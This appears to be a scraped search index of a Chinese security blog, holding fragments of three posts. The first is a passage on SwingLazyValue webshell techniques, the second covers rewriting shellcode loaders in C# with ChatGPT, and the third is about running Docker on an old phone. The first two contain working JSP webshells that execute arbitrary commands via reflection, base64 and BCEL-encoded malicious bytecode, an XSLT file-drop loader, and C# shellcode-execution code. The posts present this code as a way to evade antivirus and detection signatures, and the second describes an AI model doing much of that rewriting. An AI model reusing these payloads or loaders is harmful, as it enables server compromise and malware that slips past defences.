invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) invoke:71, Trampoline (sun.reflect.misc) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) invoke:275, MethodUtil (sun.reflect.misc) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) invoke:71, Trampoline (sun.reflect.misc) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) invoke:275, MethodUtil (sun.reflect.misc) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) createValue:73, SwingLazyValue (sun.swing) getFromHashtable:216, UIDefaults (javax.swing) get:161, UIDefaults (javax.swing) main:19, poc2 (SwingLazyValue) ","date":"2023-07-16","objectID":"/posts/swinglazyvalue-in-webshell/:3:2","series":null,"tags":[],"title":"SwingLazyValue在WebShell下的利用","uri":"/posts/swinglazyvalue-in-webshell/#利用二套娃反射执行命令"},{"categories":null,"content":"\r3.3 利用三：defineClass加载字节码既然我们已经可以做到不受静态方法的限制做到任意方法的调用，那么我们就可以通过套娃反射调用sun.misc.Unsafe#defineClass 准备好一个恶意类，通过System-property来传递要执行的命令 public class exp { static { String cmd = System.getProperty(\"cmd\"); StringBuilder stringBuilder = new StringBuilder(); BufferedReader bufferedReader; try { bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd.split(\" \")).getInputStream())); String line; while ((line = bufferedReader.readLine()) != null) { stringBuilder.append(line).append(\"\\n\"); } } catch (IOException e) { e.printStackTrace(); } System.setProperty(\"ret\", stringBuilder.toString()); } } javax.swing.UIDefaults#get sun.swing.SwingLazyValue#createValue sun.reflect.misc.MethodUtil#invoke sun.misc.Unsafe#defineClass 这里要触发两次UIDefaults.get，第一次是加载恶意类，第二次是Class.forName触发恶意类的static代码块 \u003c%@ page import=\"java.util.Hashtable\" %\u003e \u003c%@ page import=\"javax.swing.*\" %\u003e \u003c%@ page import=\"sun.swing.SwingLazyValue\" %\u003e \u003c%@ page import=\"java.lang.reflect.Method\" %\u003e \u003c%@ page import=\"sun.reflect.misc.MethodUtil\" %\u003e \u003c%@ page import=\"sun.misc.BASE64Decoder\" %\u003e \u003c%@ page import=\"sun.misc.Unsafe\" %\u003e \u003c%@ page import=\"java.security.ProtectionDomain\" %\u003e \u003c%@ page import=\"java.lang.reflect.Field\" %\u003e \u003c% byte[] bcode = new BASE64Decoder().decodeBuffer(\"yv66vgAAADQAYwoAGAAxCAAnCgAyADMHADQKAAQAMQcANQcANgoANwA4CAA5CgA6ADsKADcAPAoAPQA+CgAHAD8KAAYAQAoABgBBCgAEAEIIAEMHAEQKABIARQgARgoABABHCgAyAEgHAEkHAEoBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABUxleHA7AQAIPGNsaW5pdD4BAARsaW5lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAOYnVmZmVyZWRSZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQADY21kAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA1TdGFja01hcFRhYmxlBwBLBwA0BwA1BwBEAQAKU291cmNlRmlsZQEACGV4cC5qYXZhDAAZABoHAEwMAE0ATgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHAE8MAFAAUQEAASAHAEsMAFIAUwwAVABVBwBWDABXAFgMABkAWQwAGQBaDABbAFwMAF0AXgEAAQoBABNqYXZhL2lvL0lPRXhjZXB0aW9uDABfABoBAANyZXQMAGAAXAwAYQBiAQADZXhwAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABXNwbGl0AQAnKExqYXZhL2xhbmcvU3RyaW5nOylbTGphdmEvbGFuZy9TdHJpbmc7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAD3ByaW50U3RhY2tUcmFjZQEACHRvU3RyaW5nAQALc2V0UHJvcGVydHkBADgoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwAhABcAGAAAAAAAAgABABkAGgABABsAAAAvAAEAAQAAAAUqtwABsQAAAAIAHAAAAAYAAQAAAAUAHQAAAAwAAQAAAAUAHgAfAAAACAAgABoAAQAbAAAA+gAHAAQAAABWEgK4AANLuwAEWbcABUy7AAZZuwAHWbgACCoSCbYACrYAC7YADLcADbcADk0stgAPWU7GABErLbYAEBIRtgAQV6f/7KcACE4ttgATEhQrtgAVuAAWV7EAAQAOAEMARgASAAMAHAAAACoACgAAAAgABgAJAA4ADAAsAA8ANQAQAEMAFABGABIARwATAEsAFQBVABYAHQAAADQABQAyABEAIQAiAAMALAAaACMAJAACAEcABAAlACYAAwAGAE8AJwAiAAAADgBHACgAKQABACoAAAAgAAT+ACwHACsHACwHAC0W/wACAAIHACsHACwAAQcALgQAAQAvAAAAAgAw\"); System.setProperty(\"cmd\", \"open /\"); Method invoke = MethodUtil.class.getMethod(\"invoke\", Method.class, Object.class, Object[].class); Method defineClass = Unsafe.class.getDeclaredMethod(\"defineClass\", String.class, byte[].class, int.class, int.class, ClassLoader.class, ProtectionDomain.class); Field f = Unsafe.class.getDeclaredField(\"theUnsafe\"); f.setAccessible(true); Object unsafe = f.get(null); Object[] ags = new Object[]{invoke, new Object(), new Object[]{defineClass, unsafe, new Object[]{\"exp\", bcode, 0, bcode.length, null, null}}}; SwingLazyValue swingLazyValue = new SwingLazyValue(\"sun.reflect.misc.MethodUtil\", \"invoke\", ags); SwingLazyValue swingLazyValue1 = new SwingLazyValue(\"exp\", null, n","date":"2023-07-16","objectID":"/posts/swinglazyvalue-in-webshell/:3:3","series":null,"tags":[],"title":"SwingLazyValue在WebShell下的利用","uri":"/posts/swinglazyvalue-in-webshell/#利用三defineclass加载字节码"},{"categories":null,"content":"\r3.4 利用四：BCEL加载字节码JDK中还有一个神奇的类：com.sun.org.apache.bcel.internal.util.JavaWrapper，可以通过BCEL加载字节码。 这个类比较小众，在之前的CTF中也被人挖掘了出来。BCEL虽然不需要出网但是会有版本限制。 javax.swing.UIDefaults#get sun.swing.SwingLazyValue#createValue com.sun.org.apache.bcel.internal.util.JavaWrapper#_main \u003c%@ page import=\"javax.swing.*\" %\u003e \u003c%@ page import=\"sun.swing.SwingLazyValue\" %\u003e \u003c% String payload = \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dU$dbR$TY$U$5d$H$9a$9c$d0i$40$C$u$a83$e3$8c$b7$80$c1$ccx$X$itp$f0$82$B$U$Q$8c$f7N$e7$Q$h$93N$aa$d3$a1$f4$8b$7c$f6$rPC$d5$3c$ce$83$9f$e2G$e8$ac$d3$J$81$94m$95$3c$ec$e6$ac$bd$f7$da$d7s$f2$e9$cb$3f$ff$C$b8$84M$T$a3$b8$g$c7$84$89k$b8$$1e$c2$c0U$89i$89$h$s$fe$c4L$i7M$dc$c2_$fa0k$e26$fe6$n1g$o$86$3bZ$dc$d5$O$f7$e2$b8$_1o$o$89$Hqd5$b4$a0$J$X$r$96$q$k$K$c4n$b8$9e$h$cc$It$a7$c6$d7$E$8c$db$95$82$S$Y$c8$ba$9eZ$ac$97$f3$ca_$b5$f3$r$o$c9l$c5$b1Kk$b6$ef$eas$L4$827n$8d$i$d9$b9$z$b74$z$d0$f3$aal$bb$9e$c0$e1$d4$b3$ec$a6$bdegJ$b6W$cc$ac$E$be$eb$V$a7C$fa$Sy5$d97Z$81$fe$7c$7dcC$f9$aa$b0$ac$ec$82$f2$FF$9bVn$r3$db$a1$a1$ad$m$c9H$5b$7d$7fi$ee$9d$a3$aa$81$5b$f1$a83l$bf$b8$r0$U$91$C$abt$ca$F$81$beZx$9e$ad$bb$a50$d2$d87$a6$z$V$3d$faV$C$dby$bb$60W$c3$9a$r$kq$U$e1$U$c6$d9W$B$b3$j$ba$s$b1$cc$f3J$a5$ee$3b$ea$8e$ab$fb$d3$ab$fbr$5es$5b$Y$c3Q$89$V$L$abx$yp$e4$3b$f1$d8$ba$e8$9a$99c$bbZ$afZ$P$e8$a5$ecrS$t$b1fa$jO$d8$96$T$cc$cfB$OO$z$3c$c3s$89$X$W$5e$e2$95$O$feZ$L$a6$91$87c$a1$A$s$tL6$v$a2$85$W6p$94$9d$f2U$60$a1$a8$cd$df$c0e$5bu$z$C$87$f63_$cao$w$t$e8$80$9a$c5$ec$f1$86P$9b$b7$d3$f0$7d$zPe$81DQ$F$P$fdJU$f9$c1$7b$813$a9$88$b5$89$g$e3$e0$3e$b6$5c$f7$C$b7$cczLR$b5$P$p$a9$83$7e$zXoh$adZr$99$f3$d9$a8H$91$hc$a8w$ca$RHE$ae$f4$B$88U8$aaV$ebL$ae$Fr$b9$99$dc$81$c1q$D$f6$S$ec$9c$u$ddGS$91$K$7d$7d$86$f6U$ad$ab$a0$d18$f5$85lx$b1$86S$91$ed$8a$d9$d5$aa$f2$b8$f8$93$3f$d4$e0$fd$e5$l$a8$f2$i$847$60$d5$b7$jF$88$H$95$bd$n$tj$Hgw$z$82$fa$87$a6$89_q$84O$9d$fe$eb$82$d0$f7$84$f2$YO$Z$7e$F$bf$3d$T$db$Q$lC$f5q$caX$T$c4O$94V$eb$ff$9f$f1$L$bf$bd8A$b2$$$ed$y$S$7c$L$7b$88$3dMv$ed$a0$3b$bb$L$p$b7$8d$9e$85$5d$c4r$bb$90$b9$j$c4$cf$r$7b$h0$hH4$60m$a3o$h$fd$8b$93$N$M$e4$a6$8c$ff$90L$8f$Z$N$iJ$OR$ac$7f$f8$fa$f9$D$cc$vCCC$c9$e1t$D$p$3b8$bc$fe$91$b1$fb1$87$7b$7c$5b$bb$c3$cc$s$60RJf$Y$a7$s$814$e5$V$M$d0f$88V$83$98$a7$e5$S$86y$3fG$c2$ecghy$91$d8o8$c9w9M$8eS8M$aeyf$7e$Gg$891$7f$a40$kV$bdJ$fe$93a$cc$y$ce$d1$ba$L$93$c4$e9$f9$Fi$89$f3$S$Z$89$dfG$bf$S$ef$96$f8$a3$89$40H$5c$d0A$402$c1_$V$81$cba$p$af$fc$P$f9$bc$c9$b6h$G$A$A\"; System.setProperty(\"cmd\", \"open /\"); SwingLazyValue swingLazyValue = new SwingLazyValue(\"com.sun.org.apache.bcel.internal.util.JavaWrapper\", \"_main\", new Object[]{new String[]{payload}}); UIDefaults u1 = new UIDefaults(); u1.put(\"aaa\", swingLazyValue); u1.get(\"aaa\"); %\u003e ","date":"2023-07-16","objectID":"/posts/swinglazyvalue-in-webshell/:3:4","series":null,"tags":[],"title":"SwingLazyValue在WebShell下的利用","uri":"/posts/swinglazyvalue-in-webshell/#利用四bcel加载字节码"},{"categories":null,"content":"\r3.5 利用五：落盘XSLT并加载由于内置了一些黑名单过滤，NacOS打内存马主要是通过这种方式绕过。首先通过com.sun.org.apache.xml.internal.security.utils.JavaUtils#writeBytesToFilename写入文件，然后通过com.sun.org.apache.xalan.internal.xslt.Process#_main去加载XSLT文件触发transform，达到任意字节码加载的目的。不需要出网，应该没有JDK版本限制，但是要写一个文件，同样需要触发两次。 这个类也捂了很久，但是还是被挖到并公开了。 \u003c%@ page import=\"java.util.Random\" %\u003e \u003c%@ page import=\"java.util.HashMap\" %\u003e \u003c%@ page import=\"sun.swing.SwingLazyValue\" %\u003e \u003c%@ page import=\"javassist.ClassPool\" %\u003e \u003c%@ page import=\"javassist.ClassClassPath\" %\u003e \u003c%@ page import=\"javax.swing.*\" %\u003e \u003c% String xsltTemplate = \"\u003cxsl:stylesheet version=\\\"1.0\\\" xmlns:xsl=\\\"http://www.w3.org/1999/XSL/Transform\\\"\\n\" + \"xmlns:b64=\\\"http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder\\\"\\n\" + \"xmlns:ob=\\\"http://xml.apache.org/xalan/java/java.lang.Object\\\"\\n\" + \"xmlns:th=\\\"http://xml.apache.org/xalan/java/java.lang.Thread\\\"\\n\" + \"xmlns:ru=\\\"http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils\\\"\\n\" + \"\u003e\\n\" + \" \u003cxsl:template match=\\\"/\\\"\u003e\\n\" + \" \u003cxsl:variable name=\\\"bs\\\" select=\\\"b64:decodeBuffer(b64:new(),'\u003cbase64_payload\u003e')\\\"/\u003e\\n\" + \" \u003cxsl:variable name=\\\"cl\\\" select=\\\"th:getContextClassLoader(th:currentThread())\\\"/\u003e\\n\" + \" \u003cxsl:variable name=\\\"rce\\\" select=\\\"ru:defineClass('\u003cclass_name\u003e',$bs,$cl)\\\"/\u003e\\n\" + \" \u003cxsl:value-of select=\\\"$rce\\\"/\u003e\\n\" + \" \u003c/xsl:template\u003e\\n\" + \" \u003c/xsl:stylesheet\u003e\"; String base64Code = \"yv66vgAAADQAYwoAGAAxCAAnCgAyADMHADQKAAQAMQcANQcANgoANwA4CAA5CgA6ADsKADcAPAoAPQA+CgAHAD8KAAYAQAoABgBBCgAEAEIIAEMHAEQKABIARQgARgoABABHCgAyAEgHAEkHAEoBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABUxleHA7AQAIPGNsaW5pdD4BAARsaW5lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAOYnVmZmVyZWRSZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQADY21kAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA1TdGFja01hcFRhYmxlBwBLBwA0BwA1BwBEAQAKU291cmNlRmlsZQEACGV4cC5qYXZhDAAZABoHAEwMAE0ATgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHAE8MAFAAUQEAASAHAEsMAFIAUwwAVABVBwBWDABXAFgMABkAWQwAGQBaDABbAFwMAF0AXgEAAQoBABNqYXZhL2lvL0lPRXhjZXB0aW9uDABfABoBAANyZXQMAGAAXAwAYQBiAQADZXhwAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABXNwbGl0AQAnKExqYXZhL2xhbmcvU3RyaW5nOylbTGphdmEvbGFuZy9TdHJpbmc7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAD3ByaW50U3RhY2tUcmFjZQEACHRvU3RyaW5nAQALc2V0UHJvcGVydHkBADgoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwAhABcAGAAAAAAAAgABABkAGgABABsAAAAvAAEAAQAAAAUqtwABsQAAAAIAHAAAAAYAAQAAAAsAHQAAAAwAAQAAAAUAHgAfAAAACAAgABoAAQAbAAAA+gAHAAQAAABWEgK4AANLuwAEWbcABUy7AAZZuwAHWbgACCoSCbYACrYAC7YADLcADbcADk0stgAPWU7GABErLbYAEBIRtgAQV6f/7KcACE4ttgATEhQrtgAVuAAWV7EAAQAOAEMARgASAAMAHAAAACoACgAAAA4ABgAPAA4AEgAsABUANQAWAEMAGgBGABgARwAZAEsAGwBVABwAHQAAADQABQAyABEAIQAiAAMALAAaACMAJAACAEcABAAlACYAAwAGAE8AJwAiAAAADgBHACgAKQABACoAAAAgAAT+ACwHACsHACwHAC0W/wACAAIHACsHACwAAQcALgQAAQAvAAAAAgAw\"; String xslt = xsltTemplate.replace(\"\u003cbase64_payload\u003e\", base64Code).replace(\"\u003cclass_name\u003e\", \"exp\"); System.setProperty(\"cmd\", \"open /\"); SwingLazyValue value1 = new SwingLazyValue(\"com.sun.org.apache.xml.internal.security.utils.JavaUtils\", \"writeBytesToFilename\", new Object[]{\"/tmp/nacos_data_temp\", xslt.getBytes()}); SwingLazyValue value2 = new SwingLazyValue(\"com.sun.org.apache.xalan.internal.xslt.Process\", \"_main\", new Object[]{new String[]{\"-XT\", \"-XSL\", \"file:///tmp/nacos_data_temp\"}}); UIDefaults uiDefaults = new UIDefaults(); UIDefaults uiDefaults2 = new UIDefaults(); uiDefaults.put(\"aaa","date":"2023-07-16","objectID":"/posts/swinglazyvalue-in-webshell/:3:5","series":null,"tags":[],"title":"SwingLazyValue在WebShell下的利用","uri":"/posts/swinglazyvalue-in-webshell/#利用五落盘xslt并加载"},{"categories":null,"content":"\r4 优化sun.swing.SwingLazyValue#createValue 因为ClassLoader的原因 ，在SwingLazyValue这里只能加载rt.jar 里面的类，而一些gadgets如jdk.nashorn.internal.codegen.DumpBytecode.dumpBytecode就位于nashorn.jar 里面 然后有师傅发现了另一个类：javax.swing.UIDefaults.ProxyLazyValue#createValue，这个类中的createValue的实现可以获取线程上下文中的类，应该来说兼容性更强。 ","date":"2023-07-16","objectID":"/posts/swinglazyvalue-in-webshell/:4:0","series":null,"tags":[],"title":"SwingLazyValue在WebShell下的利用","uri":"/posts/swinglazyvalue-in-webshell/#优化"},{"categories":null,"content":"\r5 最后当然还有一些跟其他gadgets结合的利用方式，本文主要挑选了一些较为通用的、可用于WebShell场景的例子。 有些demo看起来有点多次一举，但实际上这个类的最大用处在于可以把一些敏感的关键字放到一个字符串的位置，这样我们就可以对字符串进行变形混淆，从而隐藏掉之前难以避免的特征。 ","date":"2023-07-16","objectID":"/posts/swinglazyvalue-in-webshell/:5:0","series":null,"tags":[],"title":"SwingLazyValue在WebShell下的利用","uri":"/posts/swinglazyvalue-in-webshell/#最后"},{"categories":null,"content":"\r6 参考https://flowerwind.github.io/2023/04/17/%E8%AE%B0%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98hessian%E4%B8%8D%E5%87%BA%E7%BD%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8-md/ https://blog.wanghw.cn/security/hessian-deserialization-jdk-rce-gadget.html https://exp10it.cn/2023/06/nacos-jraft-hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rce-%E5%88%86%E6%9E%90/#javautilswritebytestofilename–systemload https://y4er.com/posts/nacos-hessian-rce/ http://www.bmth666.cn/bmth_blog/2023/02/07/0CTF-TCTF-2022-hessian-onlyJdk/ ","date":"2023-07-16","objectID":"/posts/swinglazyvalue-in-webshell/:6:0","series":null,"tags":[],"title":"SwingLazyValue在WebShell下的利用","uri":"/posts/swinglazyvalue-in-webshell/#参考"},{"categories":null,"content":"从ChatGPT到SharpAlternativeShellcodeExec","date":"2023-04-28","objectID":"/posts/sharpalternativeshellcodeexec/","series":null,"tags":[],"title":"从ChatGPT到SharpAlternativeShellcodeExec","uri":"/posts/sharpalternativeshellcodeexec/"},{"categories":null,"content":"\r1 背景利用ShellCode进行免杀是一种最常见的免杀方式，但是常见的VirtualAlloc、CreateRemoteThread这些Windows API已经被各大杀软重点监控。那么与之相对的绕过的办法就是利用一些小众的Windows API，这些API函数往往提供了回调的功能，当它的参数是指针类型的话就可以直接执行内存当中的ShellCode，这样就绕过了敏感函数识别达到执行ShellCode的目的。 最近研究了一下https://github.com/aahmad097/AlternativeShellcodeExec这个项目，该项目提供了很多绕过的API函数。在渗透测试的过程中为了逃避检测，我们常常希望实现内存加载，无文件攻击。原项目是C++写的，PE转ShellCode等方法有时候并不稳定。而C#可以直接内存加载，并且从Windows XP以来每台Windows上都默认安装了.NET，所以就萌生了用C#重写一遍的方法，同时也可以加深对项目的理解。 但是C#调用Windows API的时候需要额外进行函数的声明，并且要实现C++类型到C#类型的转化，这部分的工作十分的繁琐，也不感兴趣。所以就想到了用ChatGPT帮我去做转化。 ","date":"2023-04-28","objectID":"/posts/sharpalternativeshellcodeexec/:1:0","series":null,"tags":[],"title":"从ChatGPT到SharpAlternativeShellcodeExec","uri":"/posts/sharpalternativeshellcodeexec/#背景"},{"categories":null,"content":"\r2 初步尝试先随便找了一个回调改写试试，发现就算是硬编码ShellCode+裸的API调用，C#重写后的版本也比原版本少20个左右引擎的检出。可能是原来的项目已经被各大厂商都加过规则了，C#版本的还没有，看起来有搞头。 C++版本 C#版本 ","date":"2023-04-28","objectID":"/posts/sharpalternativeshellcodeexec/:2:0","series":null,"tags":[],"title":"从ChatGPT到SharpAlternativeShellcodeExec","uri":"/posts/sharpalternativeshellcodeexec/#初步尝试"},{"categories":null,"content":"\r3 调教ChatGPT不得不说ChatGPT确实很牛逼，本来只是想让他转换一个函数声明，但是最后几乎替我完成了一大半的重写工作（失业警告）。少部分情况下一次就能转换出能运行的代码，大多数情况我们也只需要对生成的代码进行微调即可。不过GPT偶尔也有自作聪明，胡说八道的情况，这个时候就需要调整我们的prompt来一步步引导他。 ","date":"2023-04-28","objectID":"/posts/sharpalternativeshellcodeexec/:3:0","series":null,"tags":[],"title":"从ChatGPT到SharpAlternativeShellcodeExec","uri":"/posts/sharpalternativeshellcodeexec/#调教chatgpt"},{"categories":null,"content":"\r3.1 替换等价函数最开始的咒语很简单： 将以下代码用C#重写:xxxx，但是ChatGPT有时候会自作聪明的把我们想要触发的回调函数进行等价替换了，这样也就达不到我们的效果。 ","date":"2023-04-28","objectID":"/posts/sharpalternativeshellcodeexec/:3:1","series":null,"tags":[],"title":"从ChatGPT到SharpAlternativeShellcodeExec","uri":"/posts/sharpalternativeshellcodeexec/#替换等价函数"},{"categories":null,"content":"\r3.2 错误的DllImport提示\rGPT认为EnumICMProfilesW是在mscms.dll中，但是实际上这个函数是存在于gdi32.dll中的： https://learn.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-enumicmprofilesw ","date":"2023-04-28","objectID":"/posts/sharpalternativeshellcodeexec/:3:2","series":null,"tags":[],"title":"从ChatGPT到SharpAlternativeShellcodeExec","uri":"/posts/sharpalternativeshellcodeexec/#错误的dllimport提示"},{"categories":null,"content":"\r3.3 错误的参数位置在重写EnumDesktopWindows这个回调函数的时候，ChatGPT一直给出了错误的参数调用，用于回调的addr指针应该放到倒数第二个参数，但是ChatGPT一直认为要放到倒数第一个参数，怎么提示也没用，后来自己改了。 using System; using System.Runtime.InteropServices; class Program { [DllImport(\"kernel32.dll\", SetLastError = true)] static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport(\"ntdll.dll\")] static extern void RtlMoveMemory(IntPtr dest, byte[] src, uint length); [DllImport(\"user32.dll\")] static extern bool EnumDesktopWindows(IntPtr hDesktop, EnumWindowsProc lpfn, IntPtr lParam); delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam); static bool MyCallback(IntPtr hWnd, IntPtr lParam) { // Do something with hWnd return true; } static void Main(string[] args) { // alfarom256 calc shellcode byte[] op = new byte[] { }; IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)op.Length, 0x1000, 0x40); RtlMoveMemory(addr, op, (uint)op.Length); if (addr != IntPtr.Zero) EnumDesktopWindows(GetThreadDesktop(GetCurrentThreadId()), new EnumWindowsProc(MyCallback), addr); } [DllImport(\"user32.dll\")] static extern IntPtr GetThreadDesktop(uint dwThreadId); [DllImport(\"kernel32.dll\")] static extern uint GetCurrentThreadId(); } 重写后的代码也是错误的。 ","date":"2023-04-28","objectID":"/posts/sharpalternativeshellcodeexec/:3:3","series":null,"tags":[],"title":"从ChatGPT到SharpAlternativeShellcodeExec","uri":"/posts/sharpalternativeshellcodeexec/#错误的参数位置"},{"categories":null,"content":"\r4 整体感受讲完了ChatGPT的坑，其实总体体验下来感觉还是不错的，遇到不熟悉的API可以直接问他，体验比去找文档好的多。 并且不仅会给出转换后的代码，并且还会告诉你代码的大体逻辑，以及需要注意的点。 代码逻辑的梳理 遇到报错贴给他，他也会给出一定的解决方案，当然还是需要人工检验的。 利用零零碎碎的时间，终于把45个Project都重写完了，在此期间也真正体会到了ChatGPT在提升生产力中的应用。 ","date":"2023-04-28","objectID":"/posts/sharpalternativeshellcodeexec/:4:0","series":null,"tags":[],"title":"从ChatGPT到SharpAlternativeShellcodeExec","uri":"/posts/sharpalternativeshellcodeexec/#整体感受"},{"categories":null,"content":"\r5 进一步优化在有思路的情况下，还可以用ChatGPT进一步提高免杀效果。随便改一下做个例子： 最后的代码也是可用的，弹个计算器 ","date":"2023-04-28","objectID":"/posts/sharpalternativeshellcodeexec/:5:0","series":null,"tags":[],"title":"从ChatGPT到SharpAlternativeShellcodeExec","uri":"/posts/sharpalternativeshellcodeexec/#进一步优化"},{"categories":null,"content":"\r6 无法运行的FiberContextEdit在重写后的45个项目中，利用FiberContextEdit方法的始终无法正常运行。问了ChatGPT后应该是跟C++中函数转换到C#后偏移量不同有关，限制于水平问题没有深入研究，有知道原因的同学可以私下里交流交流 项目代码已经同步到我的github，如果有问题欢迎反馈： https://github.com/yzddmr6/SharpAlternativeShellcodeExec ","date":"2023-04-28","objectID":"/posts/sharpalternativeshellcodeexec/:6:0","series":null,"tags":[],"title":"从ChatGPT到SharpAlternativeShellcodeExec","uri":"/posts/sharpalternativeshellcodeexec/#无法运行的fibercontextedit"},{"categories":null,"content":"手机运行Docker: 从修改内核到刷入原生Linux","date":"2022-12-10","objectID":"/posts/android-run-docker/","series":null,"tags":[],"title":"手机运行Docker: 从修改内核到刷入原生Linux","uri":"/posts/android-run-docker/"},{"categories":null,"content":"\r1 背景最近收拾东西翻出了抽屉里吃灰的小米6。小米6当年可以说是神机一部，最好的835遇到了最好的MIUI9。如今放在抽屉里吃灰实在可惜，想着拿来做点什么让它继续发挥余热。 随后就萌生了一个想法：在手机上跑Docker，这样的话就可以用到很多打包好的Docker应用了。后来发现有这个想法的人不止我一个，有很多大佬已经实现了。原生安卓无法直接运行Docker的原因是：安卓虽然基于Linux，但是内核阉割了很多东西，很多Docker相关的的内核选项没有开启，所以需要通过刷机来进行修改。 本人总共尝试了两种方案：一种是重新编译安卓内核，开启对应选项。不过在本人的小米6，Linux内核4.4版本，LineageOS 19.1上失败了；另一种是直接刷入原生的Linux系统，成功启动了Docker。在这里跟大家分享一下刷机的过程。 ","date":"2022-12-10","objectID":"/posts/android-run-docker/:1:0","series":null,"tags":[],"title":"手机运行Docker: 从修改内核到刷入原生Linux","uri":"/posts/android-run-docker/#背景"},{"categories":null,"content":"\r2 方案一：重新编译安卓内核如果可以通过修改安卓内核来开启Docker应该是最理想的方案：这样可以在保留手机原有功能架构的基础上来提高我们的可玩性。老外写过一篇详细的教程，可以按照这个来：https://gist.github.com/FreddieOliveira/efe850df7ff3951cb62d74bd770dce27 不过很遗憾，最后这种方案失败了，一直出现报错。找了半天也没有找到解决办法，希望知道原因的小伙伴告知我一下。 ","date":"2022-12-10","objectID":"/posts/android-run-docker/:2:0","series":null,"tags":[],"title":"手机运行Docker: 从修改内核到刷入原生Linux","uri":"/posts/android-run-docker/#方案一重新编译安卓内核"},{"categories":null,"content":"\r2.1 准备工作首先要找一份第三方维护的你的手机内核的源码，如lineageOS，PixelExperience等。这些内核代码热度较高，更新频繁，有什么bug马上就被修复了，编译的时候成功率较大。 